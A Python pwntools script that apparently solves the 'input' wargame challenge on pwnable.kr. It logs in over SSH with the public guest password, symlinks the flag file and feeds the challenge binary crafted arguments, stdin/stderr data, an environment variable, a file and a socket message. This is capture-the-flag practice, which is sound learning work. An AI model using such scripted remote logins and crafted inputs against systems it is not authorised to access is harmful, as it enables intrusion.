from pwn import *


working_dir = '/tmp/raphick_input'
port = 50503


# init connection
s = ssh(user='input2', host='pwnable.kr', port=2222, password='guest')
s.system('rm -r {}'.format(working_dir))
s.system('mkdir {}'.format(working_dir))
s.set_working_directory(working_dir)
s.system('ln -s -T /home/input2/flag flag')


# stage 1
argv = ['/home/input2/input'] + ['A'] * 99
argv[ord('A')] = '\x00'
argv[ord('B')] = '\x20\x0a\x0d'


# stage 2
s.upload_data('\x00\x0a\x00\xff', '{}/stdin'.format(working_dir))
s.upload_data('\x00\x0a\x02\xff', '{}/stderr'.format(working_dir))


# stage 3
env = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}


# stage 4
s.upload_data('\x00' * 4, '{}/\x0a'.format(working_dir))


# stage 5
argv[ord('C')] = str(port)


p = s.process(argv=argv, env=env, stdin='{}/stdin'.format(working_dir), stderr='{}/stderr'.format(working_dir))

sleep(3)
remote_connection = s.connect_remote(s.host, port)
remote_connection.send('\xde\xad\xbe\xef')

